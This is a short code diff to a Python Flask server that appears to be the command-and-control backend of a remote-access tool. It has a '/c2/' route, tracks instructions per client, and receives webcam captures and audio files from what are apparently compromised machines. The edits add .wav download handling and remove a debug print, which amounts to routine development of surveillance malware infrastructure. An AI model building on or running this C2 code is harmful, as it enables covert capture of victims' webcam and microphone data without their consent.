@@ -102,8 +102,10 @@ def user_serve_temp():
     if not authenticated():
         return ""
     file_id = request.args.get("f")
+    wav = "w" in request.args
     if f"user_temp_{file_id}.file" in os.listdir("files"):
-        return send_file(f"files/user_temp_{file_id}.file", as_attachment=True), os.remove(f"files/user_temp_{file_id}.file")
+        return send_file(f"files/user_temp_{file_id}.file", as_attachment=True, download_name=f"{file_id}.wav" if wav else f"{file_id}.file"),\
+        (os.remove(f"files/user_temp_{file_id}.file") if not wav else 200)
 
 @app.route("/c2/")
 def c2():
@@ -222,7 +224,6 @@ def outputs():
 
     # for special case of webcam avi
     if contents["type"] == "webcam":
-        print("SHOULDBFILEID:", contents['data'])
         video = cv2.VideoCapture(f"files/user_temp_{contents['data']}.file")
         _, frame = video.read()
         _, buffer = cv2.imencode('.png', frame)
@@ -233,14 +234,3 @@ def outputs():
     instruction_outputs[client][contents["instruction_id"]] = (contents["type"], contents["data"])
     write_json("instruction_outputs.json", instruction_outputs)
     return ""
-
-
-
-
-
-
-
-
-
-
-
